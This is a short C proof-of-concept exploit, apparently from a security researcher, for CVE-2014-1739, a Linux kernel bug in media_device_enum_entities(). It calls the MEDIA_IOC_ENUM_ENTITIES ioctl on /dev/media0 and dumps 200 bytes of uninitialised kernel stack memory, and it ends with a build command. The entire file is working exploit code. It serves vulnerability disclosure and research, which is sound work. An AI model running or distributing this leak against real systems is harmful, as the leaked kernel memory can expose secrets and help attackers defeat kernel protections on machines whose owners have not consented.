/*
 * $File: media-enum-poc.c
 * $Description: CVE-2014-1739: Infoleak PoC in media_device_enum_entities() leaking 200 kstack bytes on x86_32.
 * $Author: Salva Peiró <speirofr@gmail.com> (c) Copyright 2014.
 * $URL: http://speirofr.appspot.com/files/media-enum-poc.c
 * $License: GPLv2.
 */

#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <stdint.h>

#include <sys/ioctl.h>
#include <linux/media.h>
#define MEDIA_DEV "/dev/media0"

int main(int argc, char *argv[])
{
    struct media_entity_desc u_ent = {};
    char *file = MEDIA_DEV;
    int i, fd, ret;

    if (argc > 1)
        file = argv[1];
    fd = open(file, O_RDONLY);
    if (fd < 0){
        perror("open " MEDIA_DEV);
        return -1;
    }

    u_ent.id = 0 | MEDIA_ENT_ID_FLAG_NEXT;
    ret=ioctl(fd, MEDIA_IOC_ENUM_ENTITIES, &u_ent);
    if (ret < 0){
        perror("ioctl " MEDIA_DEV);
        return -1;
    }

    printf("[*] CVE-2014-1739: Infoleak PoC in media_device_enum_entities() leaking %d kstack bytes:", sizeof(u_ent.reserved) + sizeof(u_ent.raw));
    for (i = 0; i < 200/sizeof(uint32_t); i++) {
        uint32_t data = *(uint32_t*)((uint32_t*)&u_ent.reserved+i);
        if (i % 4 == 0)
            printf("\n    %08d: ", i);
        printf("0x%08x ", data);
    }
    printf("\n");

    return ret;
}

/*
 gcc -Wall -g -m32 media-enum-poc.c -o media-enum-poc # */
